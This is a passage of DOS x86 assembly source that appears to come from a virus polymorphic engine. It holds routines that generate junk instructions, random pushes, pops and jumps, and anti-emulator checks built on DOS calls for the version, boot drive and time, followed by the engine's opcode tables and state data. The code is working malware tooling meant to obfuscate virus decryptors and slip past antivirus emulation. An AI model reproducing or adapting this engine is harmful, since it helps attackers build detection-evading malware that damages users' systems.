           dec     ax                              ; bx=ffffh
           jmp     storeandint
   getbdrive:
           mov     al,0b8h
           stosb
           mov     ax,3305h
           cmp     ch,4
           je      storeandint
           sub     al,al
           mov     ah,058h
           jmp     storeandint
   onlyahint:
           mov     bx,04h
           mov     dx,07h
           push    ax
           call    do_random
           mov     ch,al
           pop     ax
   okah:
           cmp     ch,1
           je      getcdrive
           cmp     ch,2
           je      getveryfl
           cmp     ch,3
           je      get_mem_int_12
           cmp     ch,4
           je      get_equipment_list
           mov     ah,0bh                          ; get stdin status
           jmp     storeandint
   get_mem_int_12:
           mov     ax,12cdh                        ; get avaiable memory
           jmp     just_b4_end
   get_equipment_list:
           mov     ax,11cdh                        ; get bios equipment list
           jmp     just_b4_end
   getveryfl:
           mov     ah,054h                         ; get verify flag
           jmp     storeandint
   getcdrive:
           mov     ah,019h                         ; get default drive
   storeandint:
           stosw
           mov     ax,021cdh                       ; int 21h
   just_b4_end:
           stosw
   look_4_int_jmp:
           cmp     byte ptr ds:[cmp_check],1
           je      icantint
           in      al,40h
           rol     al,1
           jc      icantint
           mov     byte ptr ds:[cmp_check],1
           call    do_compare
   icantint:
           ret

   dopushpop:
           dec     di
           inc     byte ptr ds:[push_nr]   ; increment the numba of pushes
           push    ax

           mov     bx,0ah
           mov     dx,0fh
           call    do_random

           xchg    al,ah

           cmp     ah,08h
           jb      no_segment_push
           mov     al,06h                  ; push es
           cmp     ah,08h
           je      add_n_store
           add     al,08h                  ; push cs
           cmp     ah,09h
           je      add_n_store
           add     al,10h                  ; push ds
           jmp     short add_n_store
   no_segment_push:
           mov     al,50h                  ; push a reg
           add     al,ah
   add_n_store:
           stosb
           call    do_garbage

           call    do_random_dx_0f

           cmp     al,06h
           pop     ax
           jb      no_pop_segment

           mov     al,07h                  ; pop es
           jmp     try_pop_ds
   try_pop_ds:
           add     al,18h                  ; pop ds
           cmp     byte ptr ds:[ds_mody],00h
           jne     store_pop
   no_pop_segment:
           mov     al,58h                  ; pop with the selected one
           add     al,ah
   store_pop:
           stosb
           pop     cx
           dec     byte ptr ds:[push_nr]   ; number of pushes curr. active
           ret

   jumping_zone:
           mov     byte ptr ds:[cmp_check2],1      ; lock jumping
           mov     bx,06h
           mov     dx,07h
           call    do_random
           cmp     al,06h
           jne     conditional_jump
   jump_short_crea:
           mov     al,0ebh                         ; jmp short
           jmp     store_jump
   conditional_jump:
           add     al,72h                          ; jmp base
   store_jump:
           stosb                                   ; write jmp
   retry_cond_jump:
           push    di
           stosb                                   ; where will jump
           call    do_garbage
           mov     ax,di
           pop     di
           push    ax
           sub     ax,di
           dec     ax
           cmp     ax,7fh
           jbe     ok_lenght_jump
           pop     ax
           jmp     retry_cond_jump
   ok_lenght_jump:
           stosb                                   ; put the bytes to jump
           pop     di
           mov     byte ptr ds:[cmp_check],0       ; reset both checks
           mov     byte ptr ds:[cmp_check2],0
           ret

   ob_oc   db      98h,0f8h,0cch,0f9h,0fch,0fdh,0f5h,0cch  ; one byters

   one_byters:
           call    do_random_dx_0f
           sub     ah,ah
           mov     bx,offset ob_oc
           add     bx,ax
           mov     al,byte ptr ds:[bx]
           stosb
           ret

   do_antiemulator:
           cmp     byte ptr ds:[cmp_check2],01h
           jne     cont_antiemu
           jmp     end_antiemu

   cont_antiemu:
           mov     cl,ah
           call    do_random_dx_0f
           mov     ah,cl

           mov     bl,byte ptr ds:[nocx]
           mov     bh,byte ptr ds:[count_reg]

           cmp     al,02h
           je      get_bdrive

           cmp     bl,01h
           je      cant_use

           cmp     bh,01h  ; cx
           jne     canuse
   cant_use:
           jmp     end_antiemu
   canuse:
           cmp     al,01h
           je      get_dos_ver

           cmp     al,06h
           jae     set_wrong_time

           cmp     al,03h
           je      one_byters
           jmp     do_a_call

   set_wrong_time:

           cmp     bl,02h                  ; can we use DX ?
           jne     end_antiemu

           cmp     al,06h
           je      withcl
           mov     ah,0b5h                 ; mov ch,
           mov     dl,19h
           jmp     short get_rnd_tset
   withcl:
           mov     ah,0b1h                 ; mov cl,
           mov     dl,03dh
   get_rnd_tset:
           in      al,40h
           cmp     al,dl
           jb      get_rnd_tset
           xchg    al,ah                   ; store the mov
           stosw

           mov     byte ptr ds:[nocx],01h  ; enable no cx change
           call    do_garbage
           mov     byte ptr ds:[nocx],0ffh ; enable cx changing
           mov     ax,2db4h                ; mov ah,2dh
           stosw
           xor     dl,dl                   ; test al
           xor     dh,dh                   ; compare with 0
           mov     cl,03h                  ; jne
           jmp     store_and_jump



   get_dos_ver:
           cmp     bh,03h                  ; can we change bx
           je      end_antiemu

           cmp     bl,03h
           je      end_antiemu

           cmp     byte ptr ds:[point_reg],03h
           je      end_antiemu

           mov     ax,30b4h                ; get dos version
           stosw
           mov     cl,01h                  ; JAE
           in      al,40h
           ror     al,1
           jc      ok_this
           add     cl,04h                  ; JA
   ok_this:
           and     al,011b                 ; 0 - 3
           mov     dh,al
           xor     dl,dl
           mov     cl,01h
           jmp     store_and_jump

   get_bdrive:
           cmp     bh,02h                  ; is dx usable?
           je      end_antiemu

           cmp     bl,02h
           je      end_antiemu

           mov     al,0b8h                 ; mov ax,
           stosb
           mov     ax,3305h                ; get boot drive
           stosw
           mov     dl,02h                  ; check DL
           xor     dh,dh                   ; compare with 00h
           mov     cl,03h                  ; JNE

   store_and_jump:
           mov     ax,21cdh                ; int 21h
           stosw
           mov     al,82h                  ; cmp
           stosb
           mov     al,0f8h                 ; cmp base
           add     al,dl                   ; dl contains register
           mov     ah,dh                   ; dh contains value
           stosw
           mov     byte ptr ds:[emu_trick],01h
           mov     byte ptr ds:[cmp_check2],01h
           mov     al,cl                  ; cl contains type of jump
           call    conditional_jump
           mov     byte ptr ds:[emu_trick],00h
           mov     byte ptr ds:[cmp_check2],00h

   end_antiemu:
           ret

   do_a_call:
           push    ax
           mov     al,0e8h                 ; make a CALL
           stosb
           push    di
           stosw
           call    do_garbage
           pop     si
           mov     cx,di
           sub     cx,si                   ; calculate offset
           dec     cx
           dec     cx
           mov     word ptr es:[si],cx     ; here we will CALL
           call    do_garbage
           inc     byte ptr ds:[push_nr]
           pop     ax                      ; AH = usable register
           push    cx
           jmp     no_pop_segment          ; pop the IP

   instructions:

   ; the data below this line is of use by the poly to create some of the
   ; various possible operations on registers in the trash generation part

   ;ONE BYTE ONLY
   inc_16       db      040h    ; INC REG16
   dec_16       db      048h    ; DEC REG16
   mov_rr16     db      08bh    ; general first byte
   ; + 0 (03h) ADD
   ; + 8 (0bh) OR
   ; + 10 (13h) ADC
   ; + 18 (1bh) SBB
   ; + 20 (23h) AND
   ; + 28 (2bh) SUB
   ; + 30 (33h) XOR
   ; + 38 (3bh) CMP
   math_rr16    db      03h    ; basic opcode
   not_neg      db      0d0h
   rot_1        db      0d1h    ; ROL/ROR/SHL/SHR/RCR/RCL/SAR/SAL REG16,1
   rot_cl       db      0d3h    ; ROL REG16,CL
   ; +0h (0c0h)     ADD
   ; +8h (0c8h)     OR
   ; +10h (0d0h)    ADC
   ; +18h (0d8h)    SBB
   ; +20h (0e0h)    AND
   ; +28h (0e8h)    SUB
   ; +30h (0f0h)    XOR
   ; +38h (0f8h)    CMP
   add_r16i     db      0c0h    ; ADD REG16,IMMEDIATE 2 byte
   lea_reg      db      0b8h    ; LEA REG16,something

   smpe_encrypted_end:

   ; Poly data start - This will be only in memory!

   poly_data_mem:

   ; must remain in this sequence (since we use SI + x to adress this in the
   ; main poly loop)

   enc_lenght      dw      00h
   last_done       db      00h
   reg8bits        db      00h

   pointer_di      dw      00h
   secphs          dw      00h

   isword          db      00h     ; 00h = byte  operation
                                   ; 01h = word  operation
                                   ; 02h = dword operation
   isrolror        db      00h     ; 00h = no ROR/ROL
                                   ; 01h = ROR/ROL with stable CL
                                   ; 02h = ROR/ROL with inc/dec CL
   push_nr         db      00h
   can_doda        db      00h

   count_reg       db     0ffh
   point_reg       db     0ffh
   nocx            db     0ffh
   seg_sta         db     0ffh

   emu_trick       db      00h
   inverse         db      00h
   cmp_check       db      00h
   cmp_check2      db      00h

   ds_mody         db      00h     ; 00 don't modify, 01 can modify

   counter_pos     dw      00h

   jz_nr           dw      00h

   no_imm          db      00h     ; 00h use immediate when enc/dec
                                   ; 01h use register  when enc/dec

   ; Poly data end

   poly_data_mem_end:
